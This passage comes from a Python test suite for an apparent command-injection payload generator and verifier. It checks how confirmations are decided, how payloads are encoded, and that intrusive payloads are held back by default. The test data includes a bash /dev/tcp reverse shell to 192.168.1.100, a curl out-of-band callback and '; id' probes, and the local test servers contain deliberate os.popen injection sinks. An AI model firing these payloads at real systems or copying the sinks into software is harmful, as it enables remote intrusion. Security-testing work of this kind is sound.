            rec, 200, "", elapsed=1.5, baseline=1.0, margin=2.0, elapsed_confirm=None)
        self.assertEqual(quick, "no-delay")

    def test_reflection_oracle_rejects_signature_present_without_payload(self):
        # The command-output signature confirms execution only when it is absent
        # from the payload-free control response.
        rec = make_record(payload="; id", match=r"uid=\d+", expected_channel="response")
        confirmed, _ = self.gen._evaluate_verify(
            rec, 200, "uid=0(root) gid=0(root)", elapsed=0.1, baseline=0.1,
            control_body="welcome home")
        self.assertEqual(confirmed, "confirmed")
        # Same signature already in the baseline response -> not proof of execution.
        inconclusive, _ = self.gen._evaluate_verify(
            rec, 200, "uid=0(root) gid=0(root)", elapsed=0.1, baseline=0.1,
            control_body="debug: uid=0(root) always shown")
        self.assertEqual(inconclusive, "inconclusive")

    def test_verify_marks_always_reflected_signature_inconclusive(self):
        # End-to-end: a target that echoes the signature regardless of input must
        # not be reported as a confirmed RCE.
        import http.server
        import socketserver
        import threading

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                self.send_response(200)
                self.end_headers()
                # Signature present for every request, payload or not.
                self.wfile.write(b"uid=0(root) gid=0(root) groups=0(root)")

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            records = self.gen.generate_payload_records(
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none"],
            )
            results = self.gen.run_verification(
                records, url=f"http://127.0.0.1:{port}/lookup?host=FUZZ",
            )
            id_results = [r for r in results if r["payload"] == "; id"]
            self.assertTrue(id_results)
            self.assertEqual(id_results[0]["verdict"], "inconclusive")
            self.assertFalse(any(r["verdict"] == "confirmed" for r in results),
                             "a signature echoed regardless of payload must not confirm")
        finally:
            server.shutdown()
            server.server_close()

    def test_encode_for_location(self):
        # Each injection point gets its own on-the-wire encoding.
        self.assertEqual(self.gen._encode_for_location("; id", "query_value"), "%3B%20id")
        self.assertEqual(self.gen._encode_for_location("; id", "url_path"), "%3B%20id")
        self.assertEqual(self.gen._encode_for_location("; id", "form_value"), "%3B+id")
        # A JSON string body is escaped only — never percent-encoded.
        self.assertEqual(self.gen._encode_for_location("; id", "json_string"), "; id")
        self.assertEqual(self.gen._encode_for_location('a"b\\c', "json_string"), 'a\\"b\\\\c')
        # Headers stay on one line.
        self.assertEqual(self.gen._encode_for_location("a\r\nb", "header"), "a  b")
        self.assertEqual(self.gen._encode_for_location("; id", "raw"), "; id")
        with self.assertRaises(ValueError):
            self.gen._encode_for_location("x", "bogus")

    def test_detect_body_location(self):
        # Body shape drives the default...
        self.assertEqual(self.gen._detect_body_location('{"host": "FUZZ"}', []), "json_string")
        self.assertEqual(self.gen._detect_body_location('host=FUZZ&x=1', []), "form_value")
        self.assertEqual(self.gen._detect_body_location('FUZZ', []), "raw")
        # ...and an explicit Content-Type wins over the shape.
        self.assertEqual(
            self.gen._detect_body_location('FUZZ', ["Content-Type: application/json"]), "json_string")
        self.assertEqual(
            self.gen._detect_body_location('FUZZ', ["Content-Type: application/x-www-form-urlencoded"]),
            "form_value")

    def test_build_verify_request_encodes_per_injection_point(self):
        # The URL marker is percent-encoded (server URL-decodes it back)...
        target, body, hdrs = self.gen._build_verify_request(
            "; id", url="http://t/?x=FUZZ", data=None, headers=None,
            url_location="query_value", body_location="raw")
        self.assertEqual(target, "http://t/?x=%3B%20id")
        # ...while a JSON body is escaped, NOT percent-encoded: the old blanket
        # URL-encoding handed the sink a literal "%3B%20id" and broke every JSON
        # injection. Regression guard for that bug.
        _, body, _ = self.gen._build_verify_request(
            "; id", url="http://t/api", data='{"host": "FUZZ"}', headers=None,
            url_location="query_value", body_location="json_string")
        self.assertEqual(body, b'{"host": "; id"}')
        self.assertNotIn(b"%3B", body)
        # Headers carry the payload verbatim on a single line.
        _, _, hdrs = self.gen._build_verify_request(
            "; id", url="http://t/", data=None, headers=["X-Fuzz: FUZZ"],
            url_location="query_value", body_location="raw")
        self.assertEqual(hdrs["X-Fuzz"], "; id")

    def test_verify_confirms_execution_in_json_body(self):
        # End-to-end regression: a JSON-body command-injection sink must be
        # confirmed. With the old blanket URL-encoding the sink received
        # "%3B%20id" and nothing ever executed.
        import http.server
        import json as _json
        import os
        import socketserver
        import threading

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_POST(self):
                length = int(self.headers.get("Content-Length", 0))
                raw = self.rfile.read(length).decode(errors="replace")
                try:
                    host = _json.loads(raw).get("host", "")
                except Exception:
                    host = ""
                pipe = os.popen("echo " + host + " 2>&1")  # command injection sink
                out = pipe.read()
                pipe.close()
                self.send_response(200)
                self.end_headers()
                try:
                    self.wfile.write(out.encode(errors="replace"))
                except BrokenPipeError:
                    pass

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            records = self.gen.generate_payload_records(
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none"],
            )
            results = self.gen.run_verification(
                records, url=f"http://127.0.0.1:{port}/api", method="POST",
                data='{"host": "FUZZ"}',
                headers=["Content-Type: application/json"],
            )
            confirmed = [r for r in results if r["verdict"] == "confirmed"]
            self.assertTrue(confirmed, "a JSON-body RCE must be confirmed")
            self.assertTrue(any(r["payload"] == "; id" for r in confirmed))
        finally:
            server.shutdown()
            server.server_close()

    def test_canary_oracle_rejects_reflected_token(self):
        # The same-token control disambiguates reflection from execution.
        rec = make_record(payload="echo DETECTION_ABC123", token="ABC123",
                          match=r"ABC123", expected_channel="response")
        # Token in the response AND in the inert same-token control -> the target
        # echoes input, so the match is not proof of execution.
        reflected, _ = self.gen._evaluate_verify(
            rec, 200, "you sent: echo DETECTION_ABC123", elapsed=0.1, baseline=0.1,
            control_body="you sent: rcekit-control-ABC123")
        self.assertEqual(reflected, "inconclusive")
        # Token in the response but absent from the inert control -> execution.
        executed, _ = self.gen._evaluate_verify(
            rec, 200, "DETECTION_ABC123", elapsed=0.1, baseline=0.1,
            control_body="(command not found)")
        self.assertEqual(executed, "confirmed")

    def _run_detection_echo_verify(self, handler_cls):
        import socketserver
        import threading

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), handler_cls)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            records = [
                r for r in self.gen.generate_payload_records(
                    mode="detection", selected_environments=["unix"],
                    selected_contexts=["raw"], selected_encodings=["none"])
                if r.payload.startswith("echo DETECTION_")
            ]
            self.assertTrue(records, "expected a canary detection payload")
            results = self.gen.run_verification(
                records, url=f"http://127.0.0.1:{port}/lookup?host=FUZZ")
            return [r for r in results if r["payload"].startswith("echo DETECTION_")]
        finally:
            server.shutdown()
            server.server_close()

    def test_verify_canary_inconclusive_against_reflecting_target(self):
        # A target that echoes input back returns the canary without executing
        # anything, so it must never be reported as confirmed execution.
        import http.server
        import urllib.parse as up

        class Reflect(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                q = up.parse_qs(up.urlparse(self.path).query)
                host = q.get("host", [""])[0]
                self.send_response(200)
                self.end_headers()
                self.wfile.write(host.encode(errors="replace"))  # reflect, do NOT execute

        echoed = self._run_detection_echo_verify(Reflect)
        self.assertTrue(echoed)
        self.assertEqual(echoed[0]["verdict"], "inconclusive")
        self.assertFalse(any(r["verdict"] == "confirmed" for r in echoed),
                         "a reflected canary must not confirm execution")

    def test_verify_canary_confirmed_against_executing_target(self):
        # A target that actually runs the input yields the canary only for the
        # executing payload, not for the inert same-token control -> confirmed.
        import http.server
        import os
        import urllib.parse as up

        class Execute(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                q = up.parse_qs(up.urlparse(self.path).query)
                host = q.get("host", [""])[0]
                pipe = os.popen(host + " 2>/dev/null")  # runs the input directly
                out = pipe.read()
                pipe.close()
                self.send_response(200)
                self.end_headers()
                try:
                    self.wfile.write(out.encode(errors="replace"))
                except BrokenPipeError:
                    pass

        executed = self._run_detection_echo_verify(Execute)
        self.assertTrue(executed)
        self.assertEqual(executed[0]["verdict"], "confirmed")

    def test_expected_delay_ms_is_runtime_aware(self):
        cases = [
            ("sleep 5", "unix", 5000),
            ("sleep 2", "docker", 2000),
            ("sleep 1", "ruby", 1000),
            ("timeout /T 5", "windows", 5000),
            ("Start-Sleep -Seconds 3", "powershell", 3000),
            ("Start-Sleep -Milliseconds 500", "powershell", 500),
            ("import time; time.sleep(2)", "python", 2000),
            ("__import__('time').sleep(1)", "python", 1000),
            ("Thread.sleep(2000)", "java", 2000),
            ("System.Threading.Thread.Sleep(2000)", "dotnet", 2000),
            ("select(undef, undef, undef, 1)", "perl", 1000),
            ("time.Sleep(1 * time.Second)", "go", 1000),
            ("SELECT pg_sleep(1)", "sql", 1000),
            ("setTimeout(()=>console.log('x'), 1000)", "nodejs", 1000),
            ("echo DETECTION_ABC", "unix", None),  # not a sleep
        ]
        for payload, env, expected in cases:
            self.assertEqual(self.gen._expected_delay_ms(payload, env), expected,
                             f"{payload!r} @ {env}")

    def test_generated_blocking_record_carries_expected_delay(self):
        records = list(self.gen.generate_payload_records(
            mode="detection", selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["none"],
            include_blocking=True))
        sleeps = [r for r in records if r.payload == "sleep 5"]
        self.assertTrue(sleeps, "the blocking 'sleep 5' detection payload should be present")
        self.assertTrue(sleeps[0].blocking)
        self.assertEqual(sleeps[0].expected_delay_ms, 5000)
        # A non-blocking payload leaves the field unset.
        echoes = [r for r in records if r.payload.startswith("echo DETECTION_")]
        self.assertTrue(echoes)
        self.assertIsNone(echoes[0].expected_delay_ms)

    def test_oob_pending_survives_a_timed_out_delivery(self):
        # An OOB payload is confirmed out-of-band, so a timed-out delivery
        # request (status=None) must stay oob-pending, not become a flat error.
        rec = make_record(payload="; curl http://x/", expected_channel="interactsh", token="TOK")
        verdict, _ = self.gen._evaluate_verify(
            rec, None, "timed out", elapsed=8.0, baseline=1.0, margin=2.0)
        self.assertEqual(verdict, "oob-pending")

    def test_timing_timeout_is_a_candidate_not_an_error(self):
        rec = make_record(payload="; sleep 8", expected_channel="timing", blocking=True)
        # Hung past the timeout for at least the margin -> the hang may be the
        # sleep itself, so surface it as a candidate rather than a flat error.
        verdict, _ = self.gen._evaluate_verify(
            rec, None, "timed out", elapsed=6.0, baseline=1.0, margin=2.0)
        self.assertEqual(verdict, "timing-candidate-on-timeout")
        # A short hang that never cleared the margin is just an error.
        verdict, _ = self.gen._evaluate_verify(
            rec, None, "boom", elapsed=1.2, baseline=1.0, margin=2.0)
        self.assertEqual(verdict, "error")

    def test_verify_confirms_subsecond_sleep_via_expected_delay(self):
        # A 1s sleep — impossible to confirm under the old flat 2s floor — is
        # confirmed once the threshold adapts to the payload's expected delay.
        import http.server
        import socketserver
        import threading
        import time as _time
        import urllib.parse as up

        class Sleeper(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                q = up.parse_qs(up.urlparse(self.path).query)
                host = q.get("host", [""])[0]
                if "sleep" in host:
                    _time.sleep(1.0)  # the injected 1s sleep executes here
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"")

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Sleeper)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            records = [make_record(payload="; sleep 1", expected_channel="timing",
                                   blocking=True, expected_delay_ms=1000)]
            results = self.gen.run_verification(
                records, url=f"http://127.0.0.1:{port}/lookup?host=FUZZ")
            self.assertEqual(results[0]["verdict"], "confirmed")
        finally:
            server.shutdown()
            server.server_close()

    def test_build_verification_plan(self):
        recs = [
            make_record(payload="; id", category="basic_enum", safety="safe"),
            make_record(payload="; id", category="basic_enum", safety="safe"),  # duplicate
            make_record(payload="bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
                        category="reverse_shells", safety="intrusive"),
            make_record(payload="; curl http://tok.oob.example/", category="oob",
                        safety="intrusive", expected_channel="interactsh",
                        token="tok", oob_host="tok.oob.example"),
        ]
        lines, to_send = rcekit.build_verification_plan(
            recs, "GET", "http://t/?x=FUZZ",
            attacker_ip="192.168.1.100", attacker_domain="attacker.com")
        self.assertEqual(len(to_send), 3, "duplicate payloads collapse")
        text = "\n".join(lines)
        self.assertIn("3 unique payloads", text)
        self.assertIn("HIGH-IMPACT", text)
        self.assertIn("reverse_shells", text)
        self.assertIn("192.168.1.100", text)          # reverse-shell callback host
        self.assertIn("oob.example", text)            # OOB callback domain
        # --max-payloads caps what will be sent.
        _, capped = rcekit.build_verification_plan(recs, "GET", "u", max_payloads=1)
        self.assertEqual(len(capped), 1)


    def test_interleave_round_robins_buckets(self):
        recs = ([make_record(payload=f"u{i}", environment="unix") for i in range(3)]
                + [make_record(payload=f"w{i}", environment="windows") for i in range(2)])
        out = list(RCEKit._interleave(recs, key=lambda r: r.environment))
        self.assertEqual(len(out), 5)
        # The first two span both buckets instead of exhausting 'unix' first.
        self.assertEqual(out[0].environment, "unix")
        self.assertEqual(out[1].environment, "windows")

    def test_shared_payload_keeps_per_environment_provenance(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum"], selected_environments=["unix", "windows"],
            selected_contexts=["raw"], selected_encodings=["none"]))
        whoami_envs = {r.environment for r in records if r.payload == "whoami"}
        # A command shared across environments keeps a record for each, not just
        # whichever emitted it first.
        self.assertIn("unix", whoami_envs)
        self.assertIn("windows", whoami_envs)

    def test_max_payloads_samples_across_buckets(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "c.jsonl"
            self.gen.save_payloads_to_file(
                file_path=str(out), max_payloads=30, output_format="jsonl",
                selected_encodings=["none"])
            rows = [json.loads(line) for line in out.read_text().splitlines() if line.strip()]
            self.assertLessEqual(len(rows), 30)
            self.assertGreater(len({r["category"] for r in rows}), 1,
                               "a capped run must span more than one category")
            self.assertGreater(len({r["environment"] for r in rows}), 1,
                               "a capped run must span more than one environment")

    def test_text_output_has_no_duplicate_lines(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "c.txt"
            self.gen.save_payloads_to_file(
                file_path=str(out), output_format="text",
                selected_categories=["basic_enum"],
                selected_environments=["unix", "windows"],
                selected_contexts=["raw"], selected_encodings=["none"])
            lines = [line for line in out.read_text().splitlines() if line.strip()]
            self.assertTrue(lines)
            self.assertEqual(len(lines), len(set(lines)),
                             "the text wordlist must not repeat payload lines")


class VerifySafeByDefaultTestCase(unittest.TestCase):
    """The CLI must not fire high-impact payloads at a target by default."""

    def _serve(self):
        import http.server
        import socketserver
        import threading

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def _ok(self):
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"ok")

            do_GET = _ok
            do_POST = _ok

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        return server, port

    def _run(self, *args):
        return subprocess.run(
            [sys.executable, str(SCRIPT), *args],
            cwd=str(REPO_ROOT), capture_output=True, text=True, timeout=120,
        )

    def test_reverse_shells_are_held_back_by_default(self):
        server, port = self._serve()
        try:
            url = f"http://127.0.0.1:{port}/?x=FUZZ"
            # Default: reverse shells are 'intrusive', so nothing is fired.
            safe = self._run("--acknowledge-consent", "--categories", "reverse_shells",
                             "--environments", "unix", "--verify-url", url)
            self.assertEqual(safe.returncode, 0, safe.stderr)
            self.assertIn("0 unique payloads to send", safe.stdout)
            self.assertIn("--verify-active-risk intrusive", safe.stdout)
            # Opt in: now they are included and the plan flags the high-impact set.
            active = self._run("--acknowledge-consent", "--categories", "reverse_shells",
                               "--environments", "unix", "--verify-active-risk", "intrusive",
                               "--max-payloads", "15", "--verify-url", url)
            self.assertEqual(active.returncode, 0, active.stderr)
            self.assertIn("HIGH-IMPACT", active.stdout)
            self.assertIn("reverse_shells", active.stdout)
            self.assertIn("192.168.1.100", active.stdout)  # reverse-shell callback host
            self.assertNotIn("0 unique payloads to send", active.stdout)
        finally:
            server.shutdown()
            server.server_close()


class DoctorTestCase(unittest.TestCase):
    """Corpus integrity check and hard-fail on a missing/empty corpus."""

    def _run(self, *args):
        return subprocess.run(
            [sys.executable, str(SCRIPT), *args],
            cwd=str(REPO_ROOT), capture_output=True, text=True, timeout=120,
        )

    def test_check_integrity_ok_on_shipped_corpus(self):
        ok, report = RCEKit().check_integrity()
        self.assertTrue(ok)
        self.assertTrue(any("file loaded and parsed" in line for line in report))

    def test_check_integrity_fails_on_missing_corpus(self):
        gen = RCEKit(template_path=Path("/no/such/corpus.json"))
        ok, report = gen.check_integrity()
        self.assertFalse(ok)
        self.assertTrue(any("FAIL" in line for line in report))
        self.assertFalse(gen.corpus_ready("exploit")[0])
        self.assertFalse(gen.corpus_ready("detection")[0])

    def test_corpus_ready_is_mode_aware(self):
        with tempfile.TemporaryDirectory() as tmp:
            tf = Path(tmp) / "only_detection.json"
            tf.write_text(json.dumps(
                {"detection_payloads": {"unix": ["echo DETECTION_{canary}"]}}))
            gen = RCEKit(template_path=tf)
            self.assertTrue(gen.corpus_ready("detection")[0])
            self.assertFalse(gen.corpus_ready("exploit")[0])  # no exploit categories

    def test_doctor_cli_exit_codes(self):
        good = self._run("--doctor")
        self.assertEqual(good.returncode, 0)
        self.assertIn("[doctor] OK", good.stdout)
        bad = self._run("--doctor", "--template-file", "/no/such/corpus.json")
        self.assertEqual(bad.returncode, 1)
        self.assertIn("PROBLEMS FOUND", bad.stdout)

    def test_run_hard_fails_on_missing_corpus(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "d.txt"
            res = self._run("--detection-only", "--template-file", "/no/such/corpus.json",
                            "-o", str(out))
            self.assertEqual(res.returncode, 1)
            self.assertIn("Refusing to run", res.stdout)
            self.assertFalse(out.exists())


class NewSinkCoverageTestCase(unittest.TestCase):
    """Sinks added from the real-world Vulhub evaluation. Each new payload must
    carry the right machine-readable oracle so verification can confirm it."""

    def setUp(self):
        self.gen = RCEKit()

    def test_exec_ast_python_sink_confirms_via_command_oracle(self):
        # Langflow-class sink: exec() of AST function-defs runs decorators and
        # default-arg expressions. Payloads are function definitions; the existing
        # command oracles must still attach.
        records = list(self.gen.generate_payload_records(
            selected_categories=["code_execution"], selected_environments=["python"],
            selected_contexts=["raw"], selected_encodings=["none"],
        ))
        exec_ast = [r for r in records if r.sink == "exec_ast"]
        self.assertTrue(exec_ast, "exec_ast sink must emit payloads")
        self.assertTrue(all(("def " in r.payload or "@" in r.payload) for r in exec_ast))
        self.assertTrue(any(r.match == r"uid=\d+" for r in exec_ast))
        self.assertTrue(any(r.match and "root:" in r.match for r in exec_ast))

    def test_expression_template_nodejs_sink_present_with_oracle(self):
        # n8n-class sink: server-side {{ }} expression evaluation with a sandbox
        # escape reaching child_process.
        records = list(self.gen.generate_payload_records(
            selected_categories=["code_execution"], selected_environments=["nodejs"],
            selected_contexts=["raw"], selected_encodings=["none"],
        ))
        expr = [r for r in records if r.sink == "expression_template"]
        self.assertTrue(expr, "expression_template sink must emit payloads")
        self.assertTrue(any("this.process" in r.payload for r in expr))
        self.assertTrue(any(r.match == r"uid=\d+" for r in expr))

    def test_psql_meta_command_sink_carries_cr_bypass_and_oracle(self):
        # pgAdmin-class sink: psql \! meta-command with a CR (\r) validator bypass.
        records = list(self.gen.generate_payload_records(
            selected_categories=["code_execution"], selected_environments=["postgres"],
            selected_contexts=["raw"], selected_encodings=["none"],
        ))
        psql = [r for r in records if r.sink == "psql_meta_command"]
        self.assertTrue(psql, "psql_meta_command sink must emit payloads")
        self.assertTrue(any("\r" in r.payload and "\\!" in r.payload for r in psql),
                        "a CR-separated \\! bypass variant must be present")
        self.assertTrue(any(r.match == r"uid=\d+" for r in psql))

    def test_math_canary_is_a_unique_product_not_49(self):
        # The fixed 7*7=49 signature collides with any '49' on the page; the {math}
        # canary must expand to a random product with a matching unique oracle.
        seen_products = set()
        for _ in range(5):
            gen = RCEKit()
            records = list(gen.generate_payload_records(
                selected_categories=["code_execution"], selected_environments=["python"],
                selected_contexts=["raw"], selected_encodings=["none"],
            ))
            # The canary is a multi-digit product ({{ 1234*5678 }}); match it
            # precisely so it is never confused with the fixed {{7*7}} probe.
            math = [r for r in records
                    if re.fullmatch(r"\{\{\s*\d{3,}\*\d{3,}\s*\}\}", r.payload.strip())]
            self.assertTrue(math, "a {math} canary payload must be emitted")
            for r in math:
                m = re.search(r"(\d+)\*(\d+)", r.payload)
                product = int(m.group(1)) * int(m.group(2))
                self.assertRegex(str(product), r.match)
                self.assertNotEqual(product, 49)
                seen_products.add(product)
        self.assertGreater(len(seen_products), 1, "products must be randomized per run")


class EncodedOracleTestCase(unittest.TestCase):
    """O5: the confirmation oracle must see through common output wrappers so a
    sink that base64/hex/url/unicode-encodes command output is still confirmed."""

    def setUp(self):
        self.gen = RCEKit()

    def test_matches_output_through_common_wrappers(self):
        import base64
        out = "uid=0(root) gid=0(root)"
        pat = r"uid=\d+"
        self.assertTrue(self.gen._encoded_search(pat, out))
        self.assertTrue(self.gen._encoded_search(pat, "b64:" + base64.b64encode(out.encode()).decode()))
        self.assertTrue(self.gen._encoded_search(pat, "hex=" + out.encode().hex()))
        self.assertTrue(self.gen._encoded_search(pat, "q=uid%3D0%28root%29"))

    def test_no_false_positive_on_benign_body(self):
        self.assertFalse(self.gen._encoded_search(r"uid=\d+", "welcome — 49 documents processed"))


class VerifyChainTestCase(unittest.TestCase):
    """O2: the session-aware multi-step chain runner reaches sinks a single
    stateless request cannot — confirming in-band (match oracle) and out-of-band
    (a {callback} URL received by the built-in listener)."""

    def setUp(self):
        self.gen = RCEKit()

    @staticmethod
    def _free_port():
        import socket
        s = socket.socket()
        s.bind(("127.0.0.1", 0))
        port = s.getsockname()[1]
        s.close()
        return port

    def test_chain_confirms_in_band_via_multi_step_flow(self):
        import http.server, socketserver, threading, re as _re, urllib.parse as up

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):  # token page whose value a later step must reuse
                self.send_response(200); self.end_headers()
                self.wfile.write(b"session TOKEN=abc123 ready")

            def do_POST(self):
                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length).decode()
                cmd = up.parse_qs(body).get("cmd", [""])[0]
                pipe = os.popen("echo " + cmd + " 2>&1")  # command injection sink
                out = pipe.read(); pipe.close()
                self.send_response(200); self.end_headers()
                try:
                    self.wfile.write(out.encode(errors="replace"))
                except BrokenPipeError:
                    pass

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            chain = {
                "base": f"http://127.0.0.1:{port}",
                "confirm_step": "run",
                "steps": [
                    {"name": "tok", "method": "GET", "path": "/session",
                     "extract": {"tok": r"TOKEN=(\w+)"}},
                    {"name": "run", "method": "POST", "path": "/run",
                     "form": {"session": "{tok}", "cmd": "FUZZ"}},
                ],
            }
            records = list(self.gen.generate_payload_records(
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none"]))
            results = self.gen.run_verification_chain(records, chain)
            confirmed = [r for r in results if r["verdict"] == "confirmed"]
            self.assertTrue(confirmed, "the chain must confirm at least one RCE")
            self.assertTrue(any(r["payload"] == "; id" for r in confirmed))
        finally:
            server.shutdown(); server.server_close()

    def test_chain_confirms_out_of_band_via_builtin_listener(self):
        import http.server, socketserver, threading, re as _re, urllib.request

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_POST(self):
                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length).decode()
                # Simulate blind execution: the "command" fetches the callback URL.
                m = _re.search(r"https?://\S+", body)
                if m:
                    try:
                        urllib.request.urlopen(m.group(0).strip("'\""), timeout=3).read()
                    except Exception:
                        pass
                self.send_response(200); self.end_headers(); self.wfile.write(b"queued")

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        listen_port = self._free_port()
        try:
            chain = {
                "base": f"http://127.0.0.1:{port}",
                "callback_host": "127.0.0.1",
                "listen_port": listen_port,
                "steps": [
                    {"name": "exec", "method": "POST", "path": "/exec", "body": "cmd=FUZZ"},
                ],
            }
            rec = make_record(payload="run {callback}", category="oob",
                              expected_channel="response", match=None)
            results = self.gen.run_verification_chain([rec], chain)
            self.assertEqual(results[0]["verdict"], "confirmed")
            self.assertIn("callback", results[0]["detail"])
        finally:
            server.shutdown(); server.server_close()


class DetectionMethodTestCase(unittest.TestCase):
    """Phase 1 — the ReflectedMath detection method and the method-driven engine.

    The confirmation invariant: a ``confirmed`` verdict requires a value the
    target *computed* (arithmetic on random operands), never a literal the
    payload already carried. Proven end-to-end against a live ``/vuln`` sink
    that executes vs a ``/reflect`` sink that only echoes — the direct
    false-positive-resistance gate from the design brief.
    """

    def setUp(self):
        self.gen = RCEKit()
        self.method = ReflectedMath(self.gen)

    def test_build_probes_carry_a_computed_expected_value(self):
        import random as _random
        rec = make_record(environment="unix", context="raw")
        probes = self.method.build_probes(rec, _random.Random(1))
        self.assertTrue(probes)
        for probe in probes:
            # The expected value is a sum the payload never spells out literally,
            # so only execution can put it in the response.
            self.assertNotIn(probe.expected, probe.payload)
            # `forbidden` is the un-executed literal, which IS in the payload;
            # its survival in a response means reflection, not execution.
            self.assertIsNotNone(probe.forbidden)
            self.assertIn(probe.forbidden, probe.payload)

    def test_windows_probe_uses_cmd_arithmetic(self):
        import random as _random
        rec = make_record(environment="windows", context="raw")
        probes = self.method.build_probes(rec, _random.Random(1))
        self.assertTrue(probes)
        self.assertIn("set /a", probes[0].payload)

    def test_confirm_distinguishes_execution_reflection_and_control(self):
        import random as _random
        rec = make_record(environment="unix", context="raw")
        probe = self.method.build_probes(rec, _random.Random(7))[0]
        # Execution: the computed value is present, the literal is gone.
        exec_body = f"output: {probe.expected} done"
        self.assertEqual(
            self.method.confirm(Observation(200, exec_body, control_body="idle"), probe).status,
            "confirmed")
        # Reflection: the target echoes the payload; the sum is never produced.
        self.assertEqual(
            self.method.confirm(Observation(200, probe.payload, control_body="idle"), probe).status,
            "negative")
        # Value also present without the payload -> not attributable to execution.
        self.assertEqual(
            self.method.confirm(Observation(200, exec_body, control_body=exec_body), probe).status,
            "inconclusive")

    def test_confirm_holds_when_target_also_echoes_the_payload(self):
        import random as _random
        rec = make_record(environment="unix", context="raw")
        probe = self.method.build_probes(rec, _random.Random(9))[0]
        # The computed value AND the raw expression are both present — the classic
        # command-injection sink that echoes the input (e.g. "PING <input>") while
        # also executing it. The computed value is unforgeable proof of execution,
        # so this must stay `confirmed`; the reflection is only noted.
        body = f"{probe.expected} but also {probe.forbidden}"
        verdict = self.method.confirm(Observation(200, body, control_body="idle"), probe)
        self.assertEqual(verdict.status, "confirmed")
        self.assertIn("reflects the payload verbatim", verdict.evidence)

    def test_reflected_math_confirms_on_executing_target_only(self):
        # /vuln runs the injected string through a shell (real execution);
        # /reflect echoes it verbatim without executing. ReflectedMath must
        # confirm on the former and never on the latter.
        import http.server
        import os
        import socketserver
        import threading
        import urllib.parse as up

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                parsed = up.urlparse(self.path)
                cmd = up.parse_qs(parsed.query).get("cmd", [""])[0]
                self.send_response(200)
                self.end_headers()
                if parsed.path == "/vuln":
                    pipe = os.popen("echo " + cmd + " 2>&1")  # command-injection sink
                    out = pipe.read()
                    pipe.close()
                else:  # /reflect: echo input, never execute
                    out = cmd
                try:
                    self.wfile.write(out.encode(errors="replace"))
                except BrokenPipeError:
                    pass

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            rec = make_record(environment="unix", context="raw")
            vuln = self.gen.run_detection(
                [rec], url=f"http://127.0.0.1:{port}/vuln?cmd=FUZZ", methods=["reflected"])
            confirmed = [r for r in vuln if r["verdict"] == "confirmed"]
            self.assertTrue(confirmed, "ReflectedMath must confirm against an executing sink")
            self.assertTrue(all(r["tier"] == "confirmed" and r["method"] == "reflected"
                                for r in confirmed))

            reflect = self.gen.run_detection(
                [rec], url=f"http://127.0.0.1:{port}/reflect?cmd=FUZZ", methods=["reflected"])
            self.assertFalse([r for r in reflect if r["verdict"] == "confirmed"],
                             "a target that only echoes input must never be confirmed")
        finally:
            server.shutdown()
            server.server_close()

    def test_confirms_echo_back_command_injection(self):
        # Regression for the most common real-world sink: a tool that echoes the
        # input back (e.g. "PING <input> ...") AND executes it. The reflected
        # literal `$((a+b))` must NOT downgrade the genuine RCE — the tag-wrapped
        # computed value is still unforgeable proof of execution.
        import http.server
        import os
        import socketserver
        import threading
        import urllib.parse as up

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                ip = up.parse_qs(up.urlparse(self.path).query).get("ip", [""])[0]
                out = os.popen("ping -c 1 " + ip + " 2>&1").read()  # injection sink
                self.send_response(200)
                self.end_headers()
                # Echoes the raw input verbatim next to the executed output.
                self.wfile.write(f"PING {ip}\n{out}".encode(errors="replace"))

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            rec = make_record(environment="unix", context="raw")
            results = self.gen.run_detection(
